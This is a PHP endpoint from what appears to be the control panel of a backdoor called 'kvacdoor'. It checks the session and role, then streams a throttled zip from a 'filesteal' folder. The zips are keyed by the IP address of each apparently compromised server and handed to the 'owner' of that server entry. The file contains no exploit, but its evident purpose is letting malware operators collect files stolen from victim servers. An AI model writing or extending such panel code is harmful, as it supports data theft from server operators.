<?php
session_start();

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

header('Content-Type: application/json');
if (!isset($_SESSION['user']['id'])) {
    http_response_code(401);
    die(json_encode(['success' => false, 'message' => 'Not Authentified']));
}
require_once dirname(__DIR__) .'/app/Models/includes.php';

if (isset($_GET['id']) && (int) $_GET['id'] !== 0)
{
    $server = Server::GetServer($_GET['id']);

    $local_file = dirname(__DIR__) . "/data/filesteal/" . $server['ip'] . ".zip";
    $download_file = 'kvacdoor-server-file-' . $server['id'] . '.zip';
    $download_rate = 5000;

    if ($server['owner'] == $AUTHUSER['id'] || $AUTHUSER['roles'] == 3) {

        if(file_exists($local_file) && is_file($local_file))
        {
            header('Cache-control: private');
            header('Content-Type: application/octet-stream');
            header('Content-Length: '.filesize($local_file));
            header('Content-Disposition: filename='.$download_file);
        
            flush();
            $file = fopen($local_file, "r");
            while(!feof($file))
            {
                // send the current file part to the browser
                print fread($file, round($download_rate * 1024));
                // flush the content to the browser
                flush();
                // sleep one second
                sleep(1);
            }
            fclose($file);
        }

    } else {
        die(json_encode(['success' => false, 'message' => 'Not Authorized']));
    }
}